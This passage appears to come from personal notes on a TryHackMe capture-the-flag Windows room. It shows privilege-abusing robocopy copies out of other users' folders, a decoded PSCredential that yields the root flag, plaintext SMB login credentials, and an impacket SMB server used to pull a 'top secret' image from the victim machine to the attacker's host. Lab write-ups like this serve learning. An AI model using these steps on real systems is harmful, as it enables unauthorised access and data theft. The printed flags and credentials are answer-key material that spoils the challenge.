As we can see we have simply copied the root file from Administrator to temp and in doing that if there were any blocked access it got removed

So let's try to access the file now and see what happens
```
robocopy /b C:\Users\Administrator\root.xml C:\Temp

robocopy /b C:\Users\Administrator C:\Temp

ls C:\Temp

```

```
Evil-WinRM* PS C:\Temp> more root.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Administrator</S>
      <SS N="Password">44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a</SS>
  </Obj>
</Objs>

```

Now we can't simply use the object method as we are not the admin of that folder who have encrypted the folder.

So will use Cyber Chef to decrypt 
![[Pasted image 20230921181057.png]]

```
Damn you are a genius.
But, I apologize for cheating you like this.

Here is your Root Flag
THM{1b4f46cc4fba46348273d18dc91da20d}

Tag me on https://twitter.com/Xyan1d3 about what part you enjoyed on this box and what part you struggled with.

If you enjoyed this box you may also take a look at the linuxagency room in tryhackme.
Which contains some linux fundamentals and privilege escalation https://tryhackme.com/room/linuxagency.
```

Got the user files but when i am trying to enumerate the twilliams there is suspicious .exe file will apply the same trick and try to execute it
![[Pasted image 20230921181415.png]]

```
robocopy /b C:\Users\twilliams C:\Temp
ls C:\Temp
```
![[Pasted image 20230921181911.png]]

```
cat definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
THM{5144f2c4107b7cab04916724e3749fb0}
```

We can't cd to a folder with a space so we have to use double quotes![[Pasted image 20230921183721.png]]

So let's download the image 
I only know SMB to upload and download let's fire up a smb share with admin user and passwd
```
smbclient \\\\10.10.216.14\\C$ -U 'xyan1d3'
cyanide9amine5628
```

![[Pasted image 20230921184333.png]]

![[Pasted image 20230921184652.png]]

Another way is
```
# Attack Machine that is out machine

root@kali -> impacket-smbserver LUFFY . -smb2support

# Victim Machine

*Evil-WinRM* PS C:\Program Files\Top Secret> copy .\top_secret.png \\10.8.167.78\LUFFY\secret.png
```
![[Pasted image 20230921185126.png]]

Got the image
